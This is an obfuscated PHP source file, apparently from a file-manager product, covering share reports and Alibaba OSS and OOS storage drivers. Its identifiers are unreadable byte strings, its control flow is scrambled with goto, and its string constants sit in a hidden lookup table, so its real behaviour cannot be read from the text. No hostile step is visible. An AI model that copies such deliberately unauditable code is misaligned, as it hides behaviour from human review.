$fÏ³„Ëš… =& $_SERVER[¹…ÕÄ]; $EºŒŸ›Ë‰ = array($fÏ³„Ëš…[404] => array($fÏ³„Ëš…[405], $B°‰æ ©¹×)); $E—»âæ¹¨– = $this->field($fÏ³„Ëš…[462])->where($EºŒŸ›Ë‰)->select(); goto fƒ‚áµ¥Ã„; F†ŠÙ‰î¾: } public function listAll($FÖÊ”ˆç’Ò) { goto b‚ç³ªíõº; AíŠù†¦º¤: return $E÷É„ğ¼; goto AÃ‰¸ªµ†; A—â õá®ô: if ($FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[718]]) { $E–ò¸®’Ùå = $FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[470]] ? $FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[470]] : strtotime(date($cœô¹ÙËŒÇ[1824])); $BÚ¼Û¤ñïÏ[$cœô¹ÙËŒÇ[192]] = array($cœô¹ÙËŒÇ[329], array($FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[718]], $E–ò¸®’Ùå)); } if ($FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[29]]) { $BÚ¼Û¤ñïÏ[$FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[29]]] = 1; } else { $BÚ¼Û¤ñïÏ[] = array($cœô¹ÙËŒÇ[467] => array($cœô¹ÙËŒÇ[948], 0), $cœô¹ÙËŒÇ[469] => array($cœô¹ÙËŒÇ[948], 0), $cœô¹ÙËŒÇ[1801] => $cœô¹ÙËŒÇ[1755]); } if ($FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[1751]]) { $BÚ¼Û¤ñïÏ[] = array($cœô¹ÙËŒÇ[464] => $FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[1751]], $cœô¹ÙËŒÇ[1409] => array($cœô¹ÙËŒÇ[378], "\x25{$FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[1751]]}\45"), $cœô¹ÙËŒÇ[1801] => $cœô¹ÙËŒÇ[1755]); } goto d ¦¾Ğ°…‡; d ¦¾Ğ°…‡: $E÷É„ğ¼ = $this->_makeOrder()->where($BÚ¼Û¤ñïÏ)->selectPage(20); if (empty($E÷É„ğ¼[$cœô¹ÙËŒÇ[365]])) { return array(); } $this->_listDataApply($E÷É„ğ¼[$cœô¹ÙËŒÇ[365]]); goto AíŠù†¦º¤; b‚ç³ªíõº: $cœô¹ÙËŒÇ =& $_SERVER[¹…ÕÄ]; $BÚ¼Û¤ñïÏ = array(); if ($FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[1504]]) { $BÚ¼Û¤ñïÏ[$cœô¹ÙËŒÇ[1504]] = $FÖÊ”ˆç’Ò[$cœô¹ÙËŒÇ[1504]]; } goto A—â õá®ô; AÃ‰¸ªµ†: } public function listDataApply($AÌ¾„•Ëá³) { $this->_listDataApply($AÌ¾„•Ëá³); return $AÌ¾„•Ëá³; } private function _listDataApply(&$D½‰…–ÕÓ‚) { goto eÑòíš—Æ; eÑòíš—Æ: $e‹ˆÈÂ«¾Ñ =& $_SERVER[¹…ÕÄ]; $D‡Ú Ø¼Óå = array_to_keyvalue($D½‰…–ÕÓ‚, $e‹ˆÈÂ«¾Ñ[33], $e‹ˆÈÂ«¾Ñ[1504]); $b°Ôùğ¤‡ = Model($e‹ˆÈÂ«¾Ñ[501])->userListInfo(array_unique($D‡Ú Ø¼Óå)); goto e‰™–“ß…ï; A¹à„²¿„²: unset($A¸™ÎòÎŞĞ); goto D¤†«‘ê ; e‰™–“ß…ï: $a“‚Ñãòƒ¬ = array_to_keyvalue($D½‰…–ÕÓ‚, $e‹ˆÈÂ«¾Ñ[33], $e‹ˆÈÂ«¾Ñ[390]); $d¡Ú¬ä·„ç = Model($e‹ˆÈÂ«¾Ñ[770])->sourceListInfo($a“‚Ñãòƒ¬, !0); foreach ($D½‰…–ÕÓ‚ as &$A¸™ÎòÎŞĞ) { $eƒôâìë¹Ë = $A¸™ÎòÎŞĞ[$e‹ˆÈÂ«¾Ñ[1504]]; $A¸™ÎòÎŞĞ[$e‹ˆÈÂ«¾Ñ[1825]] = $b°Ôùğ¤‡[$eƒôâìë¹Ë] ? $b°Ôùğ¤‡[$eƒôâìë¹Ë] : !1; $eğŸëëğÁ = $A¸™ÎòÎŞĞ[$e‹ˆÈÂ«¾Ñ[390]]; $A¸™ÎòÎŞĞ[$e‹ˆÈÂ«¾Ñ[84]] = $d¡Ú¬ä·„ç[$eğŸëëğÁ] ? $d¡Ú¬ä·„ç[$eğŸëëğÁ] : !1; } goto A¹à„²¿„²; D¤†«‘ê : } private function _makeOrder($dåªë‹—ÇÜ = '') { goto f½ƒ˜ƒí­®; Cõ„†¨†: $dåªë‹—ÇÜ = $dåªë‹—ÇÜ . "{$cá‹ÎßÇ¨¬}\x20{$aÕ÷®ëí±}"; return $this->order($dåªë‹—ÇÜ); goto a½š²½åĞ; E•§„’ÂŒ¡: $cá‹ÎßÇ¨¬ = Input::get($d°³Æ‹ò­™[429], $d°³Æ‹ò­™[7], $d°³Æ‹ò­™[410], $B·èÕŠ•¤â); $aÕ÷®ëí± = Input::get($d°³Æ‹ò­™[430], $d°³Æ‹ò­™[7], $d°³Æ‹ò­™[1826], array($d°³Æ‹ò­™[1750], $d°³Æ‹ò­™[424])); $aÕ÷®ëí± = $cÃÏ‰º„[$aÕ÷®ëí±]; goto Cõ„†¨†; f½ƒ˜ƒí­®: $d°³Æ‹ò­™ =& $_SERVER[¹…ÕÄ]; $B·èÕŠ•¤â = array($d°³Æ‹ò­™[192], $d°³Æ‹ò­™[470], $d°³Æ‹ò­™[1814], $d°³Æ‹ò­™[1815]); $cÃÏ‰º„ = array($d°³Æ‹ò­™[422] => $d°³Æ‹ò­™[423], $d°³Æ‹ò­™[424] => $d°³Æ‹ò­™[425]); goto E•§„’ÂŒ¡; a½š²½åĞ: } public function reportAdd($F¸†ª£¢¢) { $Bß²ÓÚ—£æ =& $_SERVER[¹…ÕÄ]; $e´éÅË¸‘ë = array($Bß²ÓÚ—£æ[462] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[462]], $Bß²ÓÚ—£æ[1504] => USER_ID); if (Model($Bß²ÓÚ—£æ[1822])->where($e´éÅË¸‘ë)->find()) { return !1; } $F¼…ÇŠº­‡ = array($Bß²ÓÚ—£æ[462] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[462]], $Bß²ÓÚ—£æ[1409] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[1409]], $Bß²ÓÚ—£æ[390] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[390]], $Bß²ÓÚ—£æ[441] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[441]], $Bß²ÓÚ—£æ[1504] => USER_ID, $Bß²ÓÚ—£æ[29] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[29]], $Bß²ÓÚ—£æ[425] => $F¸†ª£¢¢[$Bß²ÓÚ—£æ[425]]); return Model($Bß²ÓÚ—£æ[1822])->add($F¼…ÇŠº­‡); } public function reportList($fœã£Šô¸) { goto Eê¦•ëİ†å; B•˜À÷šÁ§: if (isset($fœã£Šô¸[$D·ÕêÎÑŒá[29]]) && in_array($fœã£Šô¸[$D·ÕêÎÑŒá[29]], array($D·ÕêÎÑŒá[86], $D·ÕêÎÑŒá[1827], $D·ÕêÎÑŒá[1828], $D·ÕêÎÑŒá[1829], $D·ÕêÎÑŒá[1830]))) { $F÷œø›ÑèÖ[$D·ÕêÎÑŒá[29]] = $fœã£Šô¸[$D·ÕêÎÑŒá[29]]; } if (isset($fœã£Šô¸[$D·ÕêÎÑŒá[705]]) && in_array($fœã£Šô¸[$D·ÕêÎÑŒá[705]], array($D·ÕêÎÑŒá[491], $D·ÕêÎÑŒá[86], $D·ÕêÎÑŒá[1827], $D·ÕêÎÑŒá[1828]))) { $F÷œø›ÑèÖ[$D·ÕêÎÑŒá[705]] = $fœã£Šô¸[$D·ÕêÎÑŒá[705]]; } $b¨ÂÈ„Ü®à = Input::get($D·ÕêÎÑŒá[430], $D·ÕêÎÑŒá[7], $D·ÕêÎÑŒá[1826], array($D·ÕêÎÑŒá[1750], $D·ÕêÎÑŒá[424])); goto C³ªÖ«ì; Eê¦•ëİ†å: $D·ÕêÎÑŒá =& $_SERVER[¹…ÕÄ]; $F÷œø›ÑèÖ = array(); if ($fœã£Šô¸[$D·ÕêÎÑŒá[718]]) { $fñÓåÒ¶“Õ = $fœã£Šô¸[$D·ÕêÎÑŒá[470]] ? $fœã£Šô¸[$D·ÕêÎÑŒá[470]] : strtotime(date($D·ÕêÎÑŒá[1824])); $F÷œø›ÑèÖ[$D·ÕêÎÑŒá[192]] = array($D·ÕêÎÑŒá[329], array($fœã£Šô¸[$D·ÕêÎÑŒá[718]], $fñÓåÒ¶“Õ)); } goto B•˜À÷šÁ§; C³ªÖ«ì: $DÑÅª¶¹›Ç = array($D·ÕêÎÑŒá[422] => $D·ÕêÎÑŒá[423], $D·ÕêÎÑŒá[424] => $D·ÕêÎÑŒá[425]); $CÒÁ´ø¼İä = $D·ÕêÎÑŒá[1831] . $DÑÅª¶¹›Ç[$b¨ÂÈ„Ü®à]; $CÏ¢¯ß¶ = Model($D·ÕêÎÑŒá[1822])->where($F÷œø›ÑèÖ)->order($CÒÁ´ø¼İä)->selectPage(20); goto aŒƒ‹ƒ‘«; aŒƒ‹ƒ‘«: if (empty($CÏ¢¯ß¶[$D·ÕêÎÑŒá[365]])) { return array(); } $this->_listDataApply($CÏ¢¯ß¶[$D·ÕêÎÑŒá[365]]); return $CÏ¢¯ß¶; goto EôÎ‡ŠØ³Ô; EôÎ‡ŠØ³Ô: } public function reportStatus($a¢…°Ïó˜Ã) { goto bÒ¿©š¤ ; bÒ¿©š¤ : $bùœİï…ğË =& $_SERVER[¹…ÕÄ]; $e¥İ ‡ïáÆ = array($bùœİï…ğË[388] => $a¢…°Ïó˜Ã[$bùœİï…ğË[388]]); $c®İ„¡„” = Model($bùœİï…ğË[1822])->where($e¥İ ‡ïáÆ)->field($bùœİï…ğË[1832])->find(); goto eØ‡Ø„È‡; EŸ¶œø¢”: return $AËÊÆ¡¹„; goto ağ‡»‚Å¥–; eØ‡Ø„È‡: if (!$c®İ„¡„”) { return !1; } $D‡Ö†ÉÑà = array($bùœİï…ğË[705] => $a¢…°Ïó˜Ã[$bùœİï…ğË[705]]); if ($a¢…°Ïó˜Ã[$bùœİï…ğË[705]] == $bùœİï…ğË[1828] && $c®İ„¡„”[$bùœİï…ğË[705]] == $bùœİï…ğË[1828]) { $D‡Ö†ÉÑà[$bùœİï…ğË[705]] = 0; } goto D‰åÇÌ¸ï§; D‰åÇÌ¸ï§: $AËÊÆ¡¹„ = Model($bùœİï…ğË[1822])->where($e¥İ ‡ïáÆ)->save($D‡Ö†ÉÑà); if ($a¢…°Ïó˜Ã[$bùœİï…ğË[705]] == $bùœİï…ğË[1827]) { if ($c®İ„¡„”[$bùœİï…ğË[441]] != $bùœİï…ğË[491] && $this->shareFileMeta($c®İ„¡„”[$bùœİï…ğË[441]])) { $this->shareFileMeta($c®İ„¡„”[$bùœİï…ğË[441]], 0); } $this->remove($c®İ„¡„”[$bùœİï…ğË[462]]); return !0; } if ($AËÊÆ¡¹„ && $a¢…°Ïó˜Ã[$bùœİï…ğË[705]] == $bùœİï…ğË[1828]) { $E°Õ‘Üâè“ = $D‡Ö†ÉÑà[$bùœİï…ğË[705]] == $bùœİï…ğË[1828] ? 1 : 0; $this->shareFileMeta($c®İ„¡„”[$bùœİï…ğË[441]], $E°Õ‘Üâè“); $this->removeByFile($c®İ„¡„”[$bùœİï…ğË[441]]); } goto EŸ¶œø¢”; ağ‡»‚Å¥–: } private function removeByFile($BÙö÷£äñ±) { goto Aã¥ÜÆ¿¿›; FéˆÖÜ¢Ãˆ: $d½†ô†øÉó = array($a¥Õğ¢ŒÈ´[390] => array($a¥Õğ¢ŒÈ´[7], $eõáÄİğÙ¿), $a¥Õğ¢ŒÈ´[467] => 1); $Däì‰»Í¾‘ = Model($a¥Õğ¢ŒÈ´[1644])->where($d½†ô†øÉó)->field($a¥Õğ¢ŒÈ´[462])->select(); if (empty($Däì‰»Í¾‘)) { return; } goto c§é“ù„Öî; c§é“ù„Öî: $AØõ³Ï³Ğ = array_to_keyvalue($Däì‰»Í¾‘, $a¥Õğ¢ŒÈ´[33], $a¥Õğ¢ŒÈ´[462]); $this->remove($AØõ³Ï³Ğ); goto aµÍÔ´ò; Aã¥ÜÆ¿¿›: $a¥Õğ¢ŒÈ´ =& $_SERVER[¹…ÕÄ]; $Däì‰»Í¾‘ = Model($a¥Õğ¢ŒÈ´[770])->where(array($a¥Õğ¢ŒÈ´[441] => $BÙö÷£äñ±))->field($a¥Õğ¢ŒÈ´[390])->select(); $eõáÄİğÙ¿ = array_to_keyvalue($Däì‰»Í¾‘, $a¥Õğ¢ŒÈ´[33], $a¥Õğ¢ŒÈ´[390]); goto FéˆÖÜ¢Ãˆ; aµÍÔ´ò: } private function shareFileMeta($Dª¸Å˜èÔò, $EĞö½ÙÎëç = null) { $døÊÙ±¯˜Ê =& $_SERVER[¹…ÕÄ]; $a¶È«ŒÖ = array($døÊÙ±¯˜Ê[441] => $Dª¸Å˜èÔò, $døÊÙ±¯˜Ê[92] => $døÊÙ±¯˜Ê[1833]); if (is_null($EĞö½ÙÎëç)) { return Model($døÊÙ±¯˜Ê[1834])->where($a¶È«ŒÖ)->find(); } $a¶È«ŒÖ[$døÊÙ±¯˜Ê[370]] = $EĞö½ÙÎëç; Model($døÊÙ±¯˜Ê[1834])->add($a¶È«ŒÖ, array(), !0); } } $Fá˜‚ÖÊÈô = $_SERVER[$_SERVER[¹…ÕÄ][811]]; $DÜŞëääñ“ = $_SERVER[¹…ÕÄ][812]; goto CÆ‡Ïí–ó; C»îƒÖ¹À : class PathDriverOOS extends PathDriverBaseS3 { public function __construct($bã‘ÕŠÌÜ) { parent::__construct($bã‘ÕŠÌÜ); $this->signatureVersion($_SERVER[¹…ÕÄ][210]); } public function fileOutLink($E¹¿êºÔÀ) { $a¥ª„˜÷Ö± =& $_SERVER[¹…ÕÄ]; if (substr($E¹¿êºÔÀ, 0, 7) == $a¥ª„˜÷Ö±[1181]) { $E¹¿êºÔÀ = $a¥ª„˜÷Ö±[1182] . substr($E¹¿êºÔÀ, 7); } header($a¥ª„˜÷Ö±[158] . $E¹¿êºÔÀ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($fä­«£Ê) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹…ÕÄ][1236]; $this->_init($fä­«£Ê); } public function _init($aÍ‹·ÒÄÑ) { $fÖ²±Ä¢Æ =& $_SERVER[¹…ÕÄ]; foreach ($aÍ‹·ÒÄÑ as $c’£‰ó£ => $F™‰°¢›«) { if (isset($this->{$c’£‰ó£})) { $this->{$c’£‰ó£} = $F™‰°¢›«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fÖ²±Ä¢Æ[1237] . LNG($fÖ²±Ä¢Æ[1238])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B¡—¢æ¹Æ¼; fÅ‰Ğ——Ô: $e…¯õƒô†ô->setMaxAgeSeconds(600); $e…¯õƒô†ô->addExposeHeader($A†…›ØïÇ†[1244]); $e…¯õƒô†ô->addAllowedHeader($A†…›ØïÇ†[1239]); goto aƒ‡¾ö·»’; B¡—¢æ¹Æ¼: $A†…›ØïÇ† =& $_SERVER[¹…ÕÄ]; $eÓ´ó‹ª = new OSS\Model\CorsConfig(); $e…¯õƒô†ô = new OSS\Model\CorsRule(); goto E¥â…âà÷; E¥â…âà÷: $e…¯õƒô†ô->addAllowedOrigin($A†…›ØïÇ†[1239]); $e…¯õƒô†ô->addAllowedMethod($A†…›ØïÇ†[1240]); $e…¯õƒô†ô->addAllowedMethod($A†…›ØïÇ†[1241]); goto DÂ—‹Æ«¯; DÂ—‹Æ«¯: $e…¯õƒô†ô->addAllowedMethod($A†…›ØïÇ†[1242]); $e…¯õƒô†ô->addAllowedMethod($A†…›ØïÇ†[1243]); $e…¯õƒô†ô->addAllowedMethod($A†…›ØïÇ†[157]); goto fÅ‰Ğ——Ô; aƒ‡¾ö·»’: $eÓ´ó‹ª->addRule($e…¯õƒô†ô); try { $this->client->putBucketCors($this->bucket, $eÓ´ó‹ª); } catch (OSS\Core\OssException $A†ó§°ë»œ) { return !1; } return !0; goto Aç„÷”’ß; Aç„÷”’ß: } public function getBucketCors() { goto Dß¿á’½Ÿ; eĞÄ¨Ÿø¶: return array($b’»ô¼ÛÓ[181] => isset($e‡òÎĞ´óé[0]) ? $e‡òÎĞ´óé[0] : $b’»ô¼ÛÓ[33], $b’»ô¼ÛÓ[185] => $F¨––®ºÊ, $b’»ô¼ÛÓ[1245] => $Fîå›ÚïÊÂ, $b’»ô¼ÛÓ[1246] => isset($a”â×êÕ[0]) ? $a”â×êÕ[0] : $b’»ô¼ÛÓ[33], $b’»ô¼ÛÓ[183] => isset($c†İù‚éñ¸[0]) ? $c†İù‚éñ¸[0] : $b’»ô¼ÛÓ[33]); goto DßìÕÖèôÙ; DÆ²¦Ì«–­: if (!$bÍµ¦Ú‘ôä || !($cÌšßîÜ = $bÍµ¦Ú‘ôä->getRules())) { return null; } $e‡òÎĞ´óé = $cÌšßîÜ[0]->getAllowedOrigins(); $F¨––®ºÊ = $cÌšßîÜ[0]->getAllowedMethods(); goto aÊ†ÒìÙ; Dß¿á’½Ÿ: $b’»ô¼ÛÓ =& $_SERVER[¹…ÕÄ]; $bÍµ¦Ú‘ôä = null; try { $bÍµ¦Ú‘ôä = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b÷‹Æ»ÄÉ˜) { return null; } goto DÆ²¦Ì«–­; aÊ†ÒìÙ: $Fîå›ÚïÊÂ = $cÌšßîÜ[0]->getMaxAgeSeconds(); $a”â×êÕ = $cÌšßîÜ[0]->getExposeHeaders(); $c†İù‚éñ¸ = $cÌšßîÜ[0]->getAllowedHeaders(); goto eĞÄ¨Ÿø¶; DßìÕÖèôÙ: } public function isBucketCors() { goto fôµÛìêŞÅ; EŠ³ÙÂêˆ´: $D¬í‹ã«Óá = array($fÙƒÃ“¦¤Ğ[186], $fÙƒÃ“¦¤Ğ[187], $fÙƒÃ“¦¤Ğ[188], $fÙƒÃ“¦¤Ğ[189], $fÙƒÃ“¦¤Ğ[190]); $fÍÛÅä‹¼ = array_diff($D¬í‹ã«Óá, $f¾ºÒÅŠÉ¸); return empty($fÍÛÅä‹¼); goto E‘Î˜Ù–É°; fôµÛìêŞÅ: $fÙƒÃ“¦¤Ğ =& $_SERVER[¹…ÕÄ]; $EÎ‘ÆÊ £ = $this->getBucketCors(); if (!$EÎ‘ÆÊ £ || !is_array($EÎ‘ÆÊ £)) { return !1; } goto B‹øÒÇõåÊ; B‹øÒÇõåÊ: if ($EÎ‘ÆÊ £[$fÙƒÃ“¦¤Ğ[181]] != $fÙƒÃ“¦¤Ğ[182] || $EÎ‘ÆÊ £[$fÙƒÃ“¦¤Ğ[183]] != $fÙƒÃ“¦¤Ğ[182]) { return !1; } $f¾ºÒÅŠÉ¸ = array_map($fÙƒÃ“¦¤Ğ[184], $EÎ‘ÆÊ £[$fÙƒÃ“¦¤Ğ[185]]); if (!is_array($f¾ºÒÅŠÉ¸)) { $f¾ºÒÅŠÉ¸ = array(); } goto EŠ³ÙÂêˆ´; E‘Î˜Ù–É°: } public function mkfile($F£½ÃŞ™ß, $EÎ¢Ôåğéâ = '', $aœ†ÉİÉÒ = REPEAT_RENAME) { $bŞÇŒªÙÅÆ = $this->setContent($F£½ÃŞ™ß, $EÎ¢Ôåğéâ); if ($bŞÇŒªÙÅÆ !== !1) { return $this->getPathOuter($F£½ÃŞ™ß); } return !1; } public function mkdir($bÉî‘”Ûº¼, $A·Ü´óÎë´ = REPEAT_SKIP) { if ($this->_isFolder($bÉî‘”Ûº¼)) { return $this->getPathOuter($bÉî‘”Ûº¼); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bÉî‘”Ûº¼)); } catch (OSS\Core\OssException $b£©®Ñ–Ë) { return !1; } return $this->getPathOuter($bÉî‘”Ûº¼); } private function fileList($aœÄÌ®º, $E»¤Á™ç¨ª = '', $dïÙ„…ÀÔ„ = 0) { goto E¯ ØäÄİ; CáÖªš÷‘: $B»Š…Ş¨ÆÜ = $DÅ“ôÂº×[33]; $cšØ¡¨…ìÍ = 1000; $bÈ¥‡³ ˆ = $this->listItemCache === !1 ? !1 : !0; goto CÊã»Ú·‚µ; E¯ ØäÄİ: $DÅ“ôÂº× =& $_SERVER[¹…ÕÄ]; $aœÄÌ®º = trim($aœÄÌ®º, $DÅ“ôÂº×[8]); $f†íšæ÷Ğ© = empty($aœÄÌ®º) ? $DÅ“ôÂº×[33] : $aœÄÌ®º . $DÅ“ôÂº×[8]; goto CáÖªš÷‘; CÊã»Ú·‚µ: $e¯‰äÚ‰ÜÏ = $bé¨ˆ“ñŸ = array(); while (!0) { check_abort(); $Fƒ¢ê·ˆª = array($DÅ“ôÂº×[1247] => $E»¤Á™ç¨ª, $DÅ“ôÂº×[1248] => $f†íšæ÷Ğ©, $DÅ“ôÂº×[1249] => $cšØ¡¨…ìÍ, $DÅ“ôÂº×[1250] => $B»Š…Ş¨ÆÜ); try { $b¬àÙ¿ŠĞ = $this->client->listObjects($this->bucket, $Fƒ¢ê·ˆª); } catch (OSS\Core\OssException $eÉ¼Œà¡¬Ê) { break; } $B»Š…Ş¨ÆÜ = $b¬àÙ¿ŠĞ->getNextMarker(); $CÚõÁ¼ÆĞ” = $b¬àÙ¿ŠĞ->getObjectList(); $BŸ‘ÑƒÀ¶ = $b¬àÙ¿ŠĞ->getPrefixList(); foreach ($CÚõÁ¼ÆĞ” as $D…˜Ã™¼œë) { goto F ½¬Š†µ; B•ÃµÑ«¾‡: if ($bÈ¥‡³ ˆ) { $this->cacheMethod($DÅ“ôÂº×[197], $D®®ª×Á, $a‚©¦«ÆÁ); $this->cacheMethod($DÅ“ôÂº×[198], $D®®ª×Á, array($DÅ“ôÂº×[77] => $a‹Îæ¹òÕ», $DÅ“ôÂº×[1251] => $a‹Îæ¹òÕ», $DÅ“ôÂº×[83] => strtotime($EªÒàİÖ), $DÅ“ôÂº×[1252] => $EªÒàİÖ)); } if ($a‚©¦«ÆÁ) { $e¯‰äÚ‰ÜÏ[] = $D®®ª×Á; continue; } $bé¨ˆ“ñŸ[] = $cÄÕ·êÛÂ; goto DÉ”¥ôõ‘; F ½¬Š†µ: if ($D…˜Ã™¼œë->getKey() == $f†íšæ÷Ğ©) { continue; } $D®®ª×Á = $D…˜Ã™¼œë->getKey(); $a‹Îæ¹òÕ» = $D…˜Ã™¼œë->getSize(); goto EŞ“Ì±ÂÄ»; EŞ“Ì±ÂÄ»: $EªÒàİÖ = $D…˜Ã™¼œë->getLastModified(); $cÄÕ·êÛÂ = $dïÙ„…ÀÔ„ ? array($DÅ“ôÂº×[28] => $D®®ª×Á, $DÅ“ôÂº×[77] => $a‹Îæ¹òÕ», $DÅ“ôÂº×[195] => strtotime($EªÒàİÖ)) : $D®®ª×Á; $a‚©¦«ÆÁ = $a‹Îæ¹òÕ» == 0 && substr($D®®ª×Á, strlen($D®®ª×Á) - 1, 1) == $DÅ“ôÂº×[8] ? !0 : !1; goto B•ÃµÑ«¾‡; DÉ”¥ôõ‘: } foreach ($BŸ‘ÑƒÀ¶ as $E ›»½‡¹¿) { $e¯‰äÚ‰ÜÏ[] = $E ›»½‡¹¿->getPrefix(); if ($bÈ¥‡³ ˆ) { $this->cacheMethod($DÅ“ôÂº×[197], $D®®ª×Á, !0); } } if ($B»Š…Ş¨ÆÜ === $DÅ“ôÂº×[33]) { break; } } if ($bÈ¥‡³ ˆ) { $this->cacheMethod($DÅ“ôÂº×[197], $aœÄÌ®º, !0); } goto aŒ–ğœĞäÔ; aŒ–ğœĞäÔ: return array($DÅ“ôÂº×[74] => $e¯‰äÚ‰ÜÏ, $DÅ“ôÂº×[73] => $bé¨ˆ“ñŸ); goto Fæ“ã«Éë; Fæ“ã«Éë: } public function copyFile($F’ÕŸ¸Ì˜Ã, $dŸ¯’»ƒÆ) { $cÌ¥ĞµÖÒö = $this->size($F’ÕŸ¸Ì˜Ã); if ($cÌ¥ĞµÖÒö < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F’ÕŸ¸Ì˜Ã, $this->bucket, $this->pathEncode($dŸ¯’»ƒÆ)); } catch (OSS\Core\OssException $Cçêßõø‚¨) { return !1; } return $this->getPathOuter($dŸ¯’»ƒÆ); } $b«Ó¼âË® = $this->multiCopyObject($F’ÕŸ¸Ì˜Ã, $dŸ¯’»ƒÆ, $cÌ¥ĞµÖÒö); return $b«Ó¼âË® ? $this->getPathOuter($dŸ¯’»ƒÆ) : !1; } private function multiCopyObject($FíÑ¦”‡‚î, $Eµ¨¢¥òµ , $Cª¶ÆŒ˜š¨) { $d¯Ù»”óÆÄ =& $_SERVER[¹…ÕÄ]; try { goto EÛÁÇí¤òí; c°ğÀí±Öå: $a– ·¬Ë¢ã = 1; $bÅËİŒ“Ïœ = 0; $bŒµ…ƒŒ·Ë = array(); goto bó§ƒÜ…¨²; EÛÁÇí¤òí: $bÂÔöçÄ“õ = array(); if ($C©œğ ßŠ² = $this->hashMd5($FíÑ¦”‡‚î)) { $bÂÔöçÄ“õ = array(OSS\OssClient::OSS_HEADERS => array($d¯Ù»”óÆÄ[1253] => $C©œğ ßŠ²)); } $dÉõ«Ã–Š = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Eµ¨¢¥òµ ), $bÂÔöçÄ“õ); goto c°ğÀí±Öå; FÚùÚóá ”: $Föéº°¡¡‰ = array(); foreach ($bŒµ…ƒŒ·Ë as $c£‡•Œ¥Çİ => $bìñë‹³Ãñ) { $Föéº°¡¡‰[] = array($d¯Ù»”óÆÄ[1257] => $c£‡•Œ¥Çİ + 1, $d¯Ù»”óÆÄ[1258] => $bìñë‹³Ãñ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Eµ¨¢¥òµ ), $dÉõ«Ã–Š, $Föéº°¡¡‰); goto d´šçøÖÜÌ; bó§ƒÜ…¨²: $E°Ø‡ïÙê— = 1024 * 1024 * 10; $aåÎ˜Ş’ˆ· = $this->client->generateMultiuploadParts($Cª¶ÆŒ˜š¨, $E°Ø‡ïÙê—); foreach ($aåÎ˜Ş’ˆ· as $c£‡•Œ¥Çİ => $b˜ÔË¾çá) { $EíŸÃË†¦ë = $bÅËİŒ“Ïœ + (int) $b˜ÔË¾çá[$d¯Ù»”óÆÄ[1254]]; $a×–½õÊ«á = (int) $b˜ÔË¾çá[$d¯Ù»”óÆÄ[333]] + $EíŸÃË†¦ë - 1; $E Öã£»—Ÿ = array($d¯Ù»”óÆÄ[1255] => $EíŸÃË†¦ë, $d¯Ù»”óÆÄ[1256] => $a×–½õÊ«á); $bŒµ…ƒŒ·Ë[] = $this->client->uploadPartCopy($this->bucket, $FíÑ¦”‡‚î, $this->bucket, $this->pathEncode($Eµ¨¢¥òµ ), $a– ·¬Ë¢ã, $dÉõ«Ã–Š, $E Öã£»—Ÿ); $a– ·¬Ë¢ã = $a– ·¬Ë¢ã + 1; } goto FÚùÚóá ”; d´šçøÖÜÌ: } catch (OSS\Core\OssException $aÜèœŞµÔš) { return !1; } return !0; } public function moveFile($Aª³èÕˆÅ£, $Eğƒ–ØÙÁø) { if ($this->copyFile($Aª³èÕˆÅ£, $Eğƒ–ØÙÁø)) { $this->remove($Aª³èÕˆÅ£); return $this->getPathOuter($Eğƒ–ØÙÁø); } return !1; } public function delFile($d«¬öŒ»Ø¯) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($d«¬öŒ»Ø¯)); } catch (OSS\Core\OssException $aæ„ÛøÁê) { return !1; } return !0; } public function delFolder($CÊåÜ½ºˆØ) { goto F¶òóèÜŒŸ; F¶òóèÜŒŸ: $dî§‹ñÛ¾¶ =& $_SERVER[¹…ÕÄ]; if (!$this->exist($CÊåÜ½ºˆØ)) { return !0; } $this->listItemCache = !1; goto dµÚŒêáØ¶; aÀ±½×µÛ¸: return $this->delByBatch($EÔ¨§ÑÂĞâ[$dî§‹ñÛ¾¶[74]]); goto Cášá¬ÔÍ; Eô „¿ö‹Õ: if (!empty($CÊåÜ½ºˆØ) && !in_array($FëÌĞàøİœ, $EÔ¨§ÑÂĞâ[$dî§‹ñÛ¾¶[74]])) { $EÔ¨§ÑÂĞâ[$dî§‹ñÛ¾¶[74]][] = $FëÌĞàøİœ; } $Bßõ‹´² = $this->delByBatch($EÔ¨§ÑÂĞâ[$dî§‹ñÛ¾¶[73]]); if (!$Bßõ‹´²) { return !1; } goto aÀ±½×µÛ¸; dµÚŒêáØ¶: $EÔ¨§ÑÂĞâ = $this->fileList($CÊåÜ½ºˆØ); $this->listItemCache = !0; $FëÌĞàøİœ = trim($CÊåÜ½ºˆØ, $dî§‹ñÛ¾¶[8]) . $dî§‹ñÛ¾¶[8]; goto Eô „¿ö‹Õ; Cášá¬ÔÍ: } private function delByBatch($d‘Ÿ‚ÅÈõÎ) { foreach (array_chunk($d‘Ÿ‚ÅÈõÎ, 1000) as $aÑ§åÏßÛ) { try { $this->client->deleteObjects($this->bucket, $aÑ§åÏßÛ); } catch (OSS\Core\OssException $b›¿£õ¼¼–) 